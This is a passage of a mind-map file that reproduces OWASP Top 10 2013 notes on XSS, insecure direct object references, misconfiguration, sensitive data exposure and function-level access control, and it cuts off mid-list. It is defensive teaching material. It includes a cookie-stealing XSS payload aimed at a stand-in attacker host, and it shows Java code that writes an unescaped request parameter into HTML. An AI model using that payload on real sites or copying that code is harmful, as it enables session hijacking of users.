    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;; </font>
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">The attacker modifies the 'CC' parameter in their browser to: </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font color="red" size="3">'&gt;&lt;script&gt;document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie&lt;/script&gt;'.</font>
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">This causes the victim&#8217;s session ID to be sent to the attacker&#8217;s website, allowing the attacker to hijack the user&#8217;s current session. </font>
    </p>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF. </font>
    </p>
    <font size="3"><br size="3" class="Apple-interchange-newline" />
    </font>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395225576047" FOLDED="true" ID="ID_45292594" MODIFIED="1395228410454">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      Stored XSS
    </p>
  </body>
</html></richcontent>
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395228274162" ID="ID_1621898909" MODIFIED="1395228286669">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="StoredXSS.png" />
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395228249559" FOLDED="true" ID="ID_1916906893" MODIFIED="1395228409688" TEXT="Reflected XSS">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395228402294" ID="ID_816456242" MODIFIED="1395228407391">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="ReflectedXSS.png" />
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395228268369" FOLDED="true" ID="ID_212075514" MODIFIED="1395293612861" TEXT="Dom based">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395228480328" ID="ID_777174339" MODIFIED="1395228483579">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="DomXSS.png" />
  </body>
</html></richcontent>
</node>
</node>
</node>
<node CREATED="1395223481337" FOLDED="true" ID="ID_1628570061" LINK="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References" MODIFIED="1395223766589" TEXT="-Insecure Direct Object References">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-4"/>
<node CREATED="1395223523012" FOLDED="true" ID="ID_1972261276" MODIFIED="1395223531162" TEXT="def">
<node CREATED="1395223524827" ID="ID_478903071" MODIFIED="1395223528193">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      <font size="13px" color="rgb(0, 0, 0)" face="sans-serif"><span style="font-variant: normal; font-family: sans-serif; background-color: rgb(242, 242, 242); text-transform: none; display: inline !important; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; float: none; font-weight: normal; color: rgb(0, 0, 0); font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.</span></font>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395223601735" ID="ID_1736115220" MODIFIED="1395223621859">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <table style="font-variant: normal; font-family: sans-serif; margin-right: 5px; background-color: rgb(248, 255, 248); text-transform: none; margin-bottom: 0px; white-space: normal; letter-spacing: normal; text-align: center; line-height: 19.200000762939453px; margin-top: 0px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 5px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <tr style="background-color: rgb(77, 149, 61); color: rgb(255, 255, 255); font-size: 17px">
        <th width="16.5%">
          <font size="3">Threat Agents </font>
        </th>
        <th width="16.5%">
          <font size="3">Attack Vectors </font>
        </th>
        <th colspan="2" width="33%">
          <font size="3">Security Weakness </font>
        </th>
        <th width="16.5%">
          <font size="3">Technical Impacts </font>
        </th>
        <th width="16.5%">
          <font size="3">Business Impacts </font>
        </th>
      </tr>
      <tr>
        <td style="font-weight: bold; background-color: rgb(217, 217, 217); color: rgb(0, 0, 0); font-size: 13px">
          <font size="3">Application Specific </font>
        </td>
        <td width="16.5%" style="background-color: rgb(255, 0, 0); color: rgb(0, 0, 0)">
          <font size="3"><b>Exploitability<br size="3" />EASY</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)">
          <font size="3"><b>Prevalence<br size="3" />COMMON</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 0, 0)">
          <font size="3"><b>Detectability<br size="3" />EASY</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)">
          <font size="3"><b>Impact<br size="3" />MODERATE</b> </font>
        </td>
        <td style="font-size: 13px; font-weight: bold; color: rgb(0, 0, 0); background-color: rgb(217, 217, 217)">
          <font size="3">Application / Business Specific </font>
        </td>
      </tr>
      <tr valign="top">
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider the types of users of your system. Do any users have only partial access to certain types of system data? </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Attacker, who is an authorized system user, simply changes a parameter value that directly refers to a system object to another object the user isn&#8217;t authorized for. Is access granted? </font>
          </p>
        </td>
        <td colspan="2" style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Applications frequently use the actual name or key of an object when generating web pages. Applications don&#8217;t always verify the user is authorized for the target object. This results in an insecure direct object reference flaw. Testers can easily manipulate parameter values to detect such flaws. Code analysis quickly shows whether authorization is properly verified. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Such flaws can compromise all the data that can be referenced by the parameter. Unless object references are unpredictable, it&#8217;s easy for an attacker to access all available data of that type. </font>
          </p>
        </td>
        <td style="text-align: left">
          <font size="3">Consider the business value of the exposed data. </font>

          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Also consider the business impact of public exposure of the vulnerability </font>
          </p>
        </td>
      </tr>
    </table>
  </body>
</html></richcontent>
</node>
<node CREATED="1395223681503" FOLDED="true" ID="ID_1189130387" MODIFIED="1395223748900" TEXT="attack example">
<node CREATED="1395223686651" ID="ID_1117486754" MODIFIED="1395223701313">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">Example Attack Scenarios </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">The application uses unverified data in a SQL call that is accessing account information: </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">String query = &quot;SELECT * FROM accts WHERE account =&#160;?&quot;; </font>
      </p>
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">PreparedStatement pstmt = connection.prepareStatement(query , &#8230; ); </font>
      </p>
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font color="red" size="3">pstmt.setString( 1, request.getParameter(&quot;acct&quot;));</font>
      </p>
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">ResultSet results = pstmt.executeQuery( ); </font>
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">The attacker simply modifies the &#8216;acct&#8217; parameter in their browser to send whatever account number they want. If not verified, the attacker can access any user&#8217;s account, instead of only the intended customer&#8217;s account. </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">http://example.com/app/accountInfo?acct=</font><font color="red" size="3">notmyacct</font>
      </p>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395223734504" FOLDED="true" ID="ID_658196613" MODIFIED="1395223764724" TEXT="Prevention">
<node CREATED="1395223750361" ID="ID_501369913" MODIFIED="1395223762584">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">How Do I Prevent 'Insecure Direct Object References'? </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename): </font>
    </p>
    <ol style="font-variant: normal; font-family: sans-serif; padding-left: 0px; margin-right: 0px; padding-top: 0px; text-transform: none; margin-bottom: 0px; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; list-style-image: none; margin-top: 0; color: rgb(0, 0, 0); font-weight: normal; margin-left: 0; padding-right: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 0px">
      <li style="margin-bottom: 0">
        <font size="3"><b>Use per user or session indirect object references.</b>&#160;This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource&#8217;s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP&#8217;s&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/ESAPI" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">ESAPI</a></font><font size="3">&#160;includes both sequential and random access reference maps that developers can use to eliminate direct object references. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3"><b>Check access.</b>&#160;Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object. </font>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node CREATED="1395297645071" FOLDED="true" ID="ID_1462234467" MODIFIED="1395298199257" TEXT="A5-Security Misconfiguration">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-5"/>
<node CREATED="1395297668573" FOLDED="true" ID="ID_173224657" MODIFIED="1395297677357" TEXT="def">
<node CREATED="1395297671473" ID="ID_1359651252" MODIFIED="1395297675827">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table cellpadding="1" border="0" width="100%" cellspacing="1">
            <tr>
              <td>
                <div style="padding-bottom: 5px; text-align: left; line-height: 1em; padding-left: 40px; font-weight: normal; background-color: rgb(242, 242, 242); padding-top: 5px; padding-right: 10px; width: 90%; font-size: 100%">
                  <p>
                    Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.
                  </p>
                </div>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
</node>
<node CREATED="1395231740387" FOLDED="true" ID="ID_1382378862" LINK="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure" MODIFIED="1395295155719" TEXT="Sensitive Data Exposure">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-6"/>
<node CREATED="1395294822105" ID="ID_1519166237" MODIFIED="1395294857521">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <center>
            <table style="margin-left: 5px; margin-bottom: 0px; text-align: center; background-color: rgb(248, 255, 248); margin-right: 5px; margin-top: 0px">
              <tr style="color: rgb(255, 255, 255); background-color: rgb(77, 149, 61); font-size: 130%">
                <th width="16.5%">
                  <font size="3">Threat Agents </font>
                </th>
                <th width="16.5%">
                  <font size="3">Attack Vectors </font>
                </th>
                <th width="33%" colspan="2">
                  <font size="3">Security Weakness </font>
                </th>
                <th width="16.5%">
                  <font size="3">Technical Impacts </font>
                </th>
                <th width="16.5%">
                  <font size="3">Business Impacts </font>
                </th>
              </tr>
              <tr>
                <td style="color: rgb(0, 0, 0); background-color: rgb(217, 217, 217); font-weight: bold; font-size: 100%">
                  <font size="3">Application Specific </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 255, 0)" width="16.5%">
                  <b><font size="3">Exploitability<br size="3" />DIFFICULT</font></b><font size="3"> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 255, 0)" width="16.5%">
                  <font size="3"><b>Prevalence<br size="3" />UNCOMMON</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)" width="16.5%">
                  <font size="3"><b>Detectability<br size="3" />AVERAGE</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 0, 0)" width="16.5%">
                  <font size="3"><b>Impact<br size="3" />SEVERE</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(217, 217, 217); font-weight: bold; font-size: 100%">
                  <font size="3">Application / Business Specific</font>
                </td>
              </tr>
              <tr valign="top">
                <td style="text-align: left">
                  <font size="3">Consider who can gain access to your sensitive data and any backups of that data. This includes the data at rest, in transit, and even in your customers&#8217; browsers. Include both external and internal threats. </font>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Attackers typically don&#8217;t break crypto directly. They break something else, such as steal keys, do man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user&#8217;s browser. </font>
                  </p>
                </td>
                <td style="text-align: left" colspan="2">
                  <p>
                    <font size="3">The most common flaw is simply not encrypting sensitive data. When crypto is employed, weak key generation and management, and weak algorithm usage is common, particularly weak password hashing techniques. Browser weaknesses are very common and easy to detect, but hard to exploit on a large scale. External attackers have difficulty detecting server side flaws due to limited access and they are also usually hard to exploit. </font>
                  </p>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive data such as health records, credentials, personal data, credit cards, etc. </font>
                  </p>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Consider the business value of the lost data and impact to your reputation. What is your legal liability if this data is exposed? Also consider the damage to your reputation.</font>
                  </p>
                </td>
              </tr>
            </table>
          </center>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395294882869" FOLDED="true" ID="ID_817384934" MODIFIED="1395294954129" TEXT="Am I Vulnerable ">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395294907649" ID="ID_455698418" MODIFIED="1395294930973">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table style="border-spacing: 0; text-align: left; width: 100%">
            <tr>
              <td style="vertical-align: top; padding-bottom: 5px; padding-left: 5px; background-color: rgb(248, 255, 248); padding-top: 5px; padding-right: 5px; width: 50%">
                <div style="padding-bottom: 3px; color: rgb(0, 0, 0); margin-bottom: 3px; border-bottom-color: rgb(153, 153, 153); border-bottom-width: 1px; border-bottom-style: solid; font-size: 150%">
                  <b><font size="4">Am I Vulnerable To 'Sensitive Data Exposure'?</font></b>
                </div>
                <p>
                  <font size="3">The first thing you have to determine is which data is sensitive enough to require extra protection. For example, passwords, credit card numbers, health records, and personal information should be protected. For all such data: </font>
                </p>
                <ol>
                  <li>
                    <font size="3">Is any of this data stored in clear text long term, including backups of this data? </font>
                  </li>
                  <li>
                    <font size="3">Is any of this data transmitted in clear text, internally or externally? Internet traffic is especially dangerous. </font>
                  </li>
                  <li>
                    <font size="3">Are any old / weak cryptographic algorithms used? </font>
                  </li>
                  <li>
                    <font size="3">Are weak crypto keys generated, or is proper key management or rotation missing? </font>
                  </li>
                  <li>
                    <font size="3">Are any browser security directives or headers missing when sensitive data is provided by / sent to the browser? </font>
                  </li>
                </ol>
                <p>
                  <font size="3">And more &#8230; For a more complete set of problems to avoid, see <a class="external text" href="https://www.owasp.org/index.php/ASVS" rel="nofollow">ASVS areas Crypto (V7), Data Prot. (V9), and SSL</a></font><a class="external text" href="https://www.owasp.org/index.php/ASVS" rel="nofollow">&#160; (V10)</a>.
                </p>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395294941033" FOLDED="true" ID="ID_1980453626" MODIFIED="1395295009059" TEXT="Prevent">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395294993755" ID="ID_1008616450" MODIFIED="1395295004943">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table style="border-spacing: 0; text-align: left; width: 100%">
            <tr>
              <td style="vertical-align: top; padding-bottom: 5px; padding-left: 5px; background-color: rgb(248, 255, 248); padding-top: 5px; padding-right: 5px; width: 50%">
                <div style="padding-bottom: 3px; color: rgb(0, 0, 0); margin-bottom: 3px; border-bottom-color: rgb(153, 153, 153); border-bottom-width: 1px; border-bottom-style: solid; font-size: 150%">
                  <font size="4">How Do I Prevent 'Sensitive Data Exposure'?</font>
                </div>
                <p>
                  The full perils of unsafe cryptography, SSL usage, and data protection are well beyond the scope of the Top 10. That said, for all sensitive data, do all of the following, at a minimum:
                </p>
                <ol>
                  <li>
                    Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all sensitive data at rest and in transit in a manner that defends against these threats.
                  </li>
                  <li>
                    Don&#8217;t store sensitive data unnecessarily. Discard it as soon as possible. Data you don&#8217;t have can&#8217;t be stolen.
                  </li>
                  <li>
                    Ensure strong standard algorithms and strong keys are used, and proper key management is in place. Consider using <a class="external text" href="http://csrc.nist.gov/groups/STM/cmvp/documents/140-1/140val-all.htm" rel="nofollow">FIPS 140 validated cryptographic modules</a>.
                  </li>
                  <li>
                    Ensure passwords are stored with an algorithm specifically designed for password protection, such as <a class="external text" href="http://en.wikipedia.org/wiki/Bcrypt" rel="nofollow">bcrypt</a>, <a class="external text" href="http://en.wikipedia.org/wiki/PBKDF2" rel="nofollow">PBKDF2</a>, or <a class="external text" href="http://en.wikipedia.org/wiki/Scrypt" rel="nofollow">scrypt</a>.
                  </li>
                  <li>
                    Disable autocomplete on forms collecting sensitive data and disable caching for pages that contain sensitive data.
                  </li>
                </ol>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395295044605" ID="ID_1137829273" MODIFIED="1395295063835" TEXT="Attack example">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395295048835" ID="ID_1758340750" MODIFIED="1395295059483">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table style="border-spacing: 0; text-align: left; width: 100%">
            <tr>
              <td style="vertical-align: top; padding-bottom: 5px; padding-left: 5px; background-color: rgb(248, 255, 248); padding-top: 5px; padding-right: 5px; width: 50%">
                <div style="padding-bottom: 3px; color: rgb(0, 0, 0); margin-bottom: 3px; border-bottom-color: rgb(153, 153, 153); border-bottom-width: 1px; border-bottom-style: solid; font-size: 150%">
                  <font size="4">Example Attack Scenarios</font>
                </div>
                <p>
                  <b>Scenario #1:</b>&#160;An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.
                </p>
                <p>
                  <b>Scenario #2:</b>&#160;A site simply doesn&#8217;t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user&#8217;s session cookie. Attacker then replays this cookie and hijacks the user&#8217;s session, accessing the user&#8217;s private data.
                </p>
                <p>
                  <b>Scenario #3:</b>&#160;The password database uses unsalted hashes to store everyone&#8217;s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.
                </p>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
</node>
<node CREATED="1395298232253" FOLDED="true" ID="ID_335098392" MODIFIED="1395310800183" TEXT="A7-Missing Function Level Access Control">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-7"/>
<node CREATED="1395298248968" ID="ID_1680542201" MODIFIED="1395298272376">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <center>
            <table style="margin-left: 5px; margin-bottom: 0px; text-align: center; background-color: rgb(248, 255, 248); margin-right: 5px; margin-top: 0px">
              <tr style="color: rgb(255, 255, 255); background-color: rgb(77, 149, 61); font-size: 130%">
                <th width="16.5%">
                  <font size="5">Threat Agents </font>
                </th>
                <th width="16.5%">
                  <font size="5">Attack Vectors </font>
                </th>
                <th width="33%" colspan="2">
                  <font size="5">Security Weakness </font>
                </th>
                <th width="16.5%">
                  <font size="5">Technical Impacts </font>
                </th>
                <th width="16.5%">
                  <font size="5">Business Impacts</font>
                </th>
              </tr>
              <tr>
                <td style="color: rgb(0, 0, 0); background-color: rgb(217, 217, 217); font-weight: bold; font-size: 100%">
                  <font size="3">Application Specific </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 0, 0)" width="16.5%">
                  <b><font size="3">Exploitability<br size="3" />EASY</font></b><font size="3"> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)" width="16.5%">
                  <font size="3"><b>Prevalence<br size="3" />COMMON</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)" width="16.5%">
                  <font size="3"><b>Detectability<br size="3" />AVERAGE</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)" width="16.5%">
                  <font size="3"><b>Impact<br size="3" />MODERATE</b> </font>
                </td>
                <td style="color: rgb(0, 0, 0); background-color: rgb(217, 217, 217); font-weight: bold; font-size: 100%">
                  <font size="3">Application / Business Specific </font>
                </td>
              </tr>
              <tr valign="top">
                <td style="text-align: left">
                  <p>
                    <font size="3">Anyone with network access can send your application a request. Could anonymous users access private functionality or regular users a privileged function? </font>
                  </p>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Attacker, who is an authorized system user, simply changes the URL or a parameter to a privileged function. Is access granted? Anonymous users could access private functions that aren&#8217;t protected. </font>
                  </p>
                </td>
                <td style="text-align: left" colspan="2">
                  <p>
                    <font size="3">Applications do not always protect application functions properly. Sometimes, function level protection is managed via configuration, and the system is misconfigured. Sometimes, developers must include the proper code checks, and they forget. </font>
                  </p>
                  <p>
                    <font size="3">Detecting such flaws is easy. The hardest part is identifying which pages (URLs) or functions exist to attack. </font>
                  </p>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack. </font>
                  </p>
                </td>
                <td style="text-align: left">
                  <p>
                    <font size="3">Consider the business value of the exposed functions and the data they process. </font>
                  </p>
                  <p>
                    <font size="3">Also consider the impact to your reputation if this vulnerability became public. </font>
                  </p>
                </td>
              </tr>
            </table>
          </center>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
<node CREATED="1395298398364" FOLDED="true" ID="ID_329659268" MODIFIED="1395298415522" TEXT="prevention">
<node CREATED="1395298404346" ID="ID_1166097690" MODIFIED="1395298413650">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table style="border-spacing: 0; text-align: left; width: 100%">
            <tr>
              <td style="vertical-align: top; padding-bottom: 5px; padding-left: 5px; background-color: rgb(248, 255, 248); padding-top: 5px; padding-right: 5px; width: 50%">
                <div style="padding-bottom: 3px; color: rgb(0, 0, 0); margin-bottom: 3px; border-bottom-color: rgb(153, 153, 153); border-bottom-width: 1px; border-bottom-style: solid; font-size: 150%">
                  <font size="3">How Do I Prevent 'Missing Function Level Access Control'?</font>
                </div>
                <p>
                  Your application should have a consistent and easy to analyze authorization module that is invoked from all of your business functions. Frequently, such protection is provided by one or more components external to the application code.
                </p>
                <ol>
                  <li>
